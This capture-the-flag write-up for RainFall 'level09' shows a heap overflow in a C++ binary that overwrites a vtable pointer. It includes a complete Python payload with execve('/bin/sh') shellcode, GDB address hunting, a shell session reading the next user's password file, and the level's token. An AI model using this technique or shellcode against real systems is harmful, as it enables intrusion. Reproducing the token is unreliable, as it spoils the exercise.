# level09

## 1. Decompilation with Ghidra

The binary contains a C++ program with a class `N` that has a dangerous `setAnnotation` method:

```c
/* N::setAnnotation(char*) */
void __thiscall N::setAnnotation(N *this, char *param_1)
{
    size_t __n;
    
    __n = strlen(param_1);
    memcpy(this + 4, param_1, __n);  // ⚠️ No size check!
    return;
}

/* N::N(int) */
void __thiscall N::N(N *this, int param_1)
{
    *(undefined ***)this = &PTR_operator+_08048848;
    *(int *)(this + 0x68) = param_1;
    return;
}

void main(int param_1, int param_2)
{
    N *this;
    N *this_00;
    
    if (param_1 < 2) {
        _exit(1);
    }
    this = (N *)operator.new(0x6c);
    N::N(this, 5);
    this_00 = (N *)operator.new(0x6c);
    N::N(this_00, 6);
    N::setAnnotation(this, *(char **)(param_2 + 4));
    (*(code *)**(undefined4 **)this_00)(this_00, this);
    return;
}
```

## 2. Analysis of the vulnerability

The vulnerability:

- The program allocates two C++ objects of class `N` on the heap (108 bytes each).
- Each object has a vtable pointer at offset 0, annotation data at offset 4, and a value at offset 0x68.
- `N::setAnnotation()` copies `argv[1]` to `this + 4` using `memcpy()` without bounds checking.
- If `argv[1]` is longer than 104 bytes, it overflows into the second object.
- The vtable pointer of the second object can be overwritten.
- The program then calls a virtual function on the second object: `(*(code *)**(undefined4 **)this_00)(this_00, this)`

The virtual function call does **double dereferencing**:

1. Read vtable pointer → get address A
2. Read at address A → get address B (function pointer)
3. Jump to address B

**Solution:** Create a fake vtable structure that points to our shellcode!

## 3. Finding heap addresses with GDB

```bash
gdb ./level9
(gdb) break *0x0804861c  # After first operator.new
(gdb) break *0x0804863e  # After second operator.new
(gdb) run AAAA

# At first breakpoint
(gdb) info registers eax
eax = 0x0804a008  # Object 1

(gdb) continue

# At second breakpoint
(gdb) info registers eax
eax = 0x0804a078  # Object 2
```

Calculate addresses:

```
Object 1:     0x0804a008
Copy starts:  0x0804a00c (obj1 + 4)
Object 2:     0x0804a078
Fake vtable:  0x0804a07c (after overwritten vtable)
Shellcode:    0x0804a080 (after fake vtable)
```

## 4. Exploitation

Memory layout after overflow:

```
Heap:
0x0804a008: [Object 1: 108 bytes (0x6c)]
            ├─ [+0x00] vtable (4 bytes)
            ├─ [+0x04] annotation (100 bytes) ← setAnnotation writes here
            └─ [+0x68] value (4 bytes)
            
0x0804a074: [Padding: 4 bytes] ← malloc metadata

0x0804a078: [Object 2: 108 bytes (0x6c)]
            ├─ [+0x00] vtable (4 bytes) 🎯 TARGET
            ├─ [+0x04] annotation (100 bytes)
            └─ [+0x68] value (4 bytes)
```

Payload structure:

```python
#!/usr/bin/env python
import sys

# Shellcode execve("/bin/sh") - 21 bytes
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68"
shellcode += "\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

# Structure:
# [padding] [fake_vtable addr] [shellcode addr] [shellcode]

padding = "\x90" * 108
fake_vtable_addr = "\x7c\xa0\x04\x08"  # 0x0804a07c
shellcode_addr = "\x80\xa0\x04\x08"    # 0x0804a080

payload = padding + fake_vtable_addr + shellcode_addr + shellcode
sys.stdout.write(payload)
```

Memory after overflow:

```
0x0804a00c: [NOPs: 108 bytes]           ← Fills obj1 annotation
0x0804a078: [0x0804a07c]                ← Vtable obj2 (points to fake vtable)
0x0804a07c: [0x0804a080]                ← Fake vtable (points to shellcode)
0x0804a080: [\x31\xc9\xf7\xe1...]       ← Shellcode execve("/bin/sh")
```

Execution flow:

1. Program calls virtual function on obj2
2. Reads vtable at 0x0804a078 → finds 0x0804a07c
3. Reads at 0x0804a07c → finds 0x0804a080
4. Jumps to 0x0804a080 → **executes shellcode!** 🎉

Full exploitation session:

```bash
level9@RainFall:~$ ./level9 $(python /tmp/exploit.py)
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
[PASSWORD]
```

## 5. Token discovered

The token found `f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
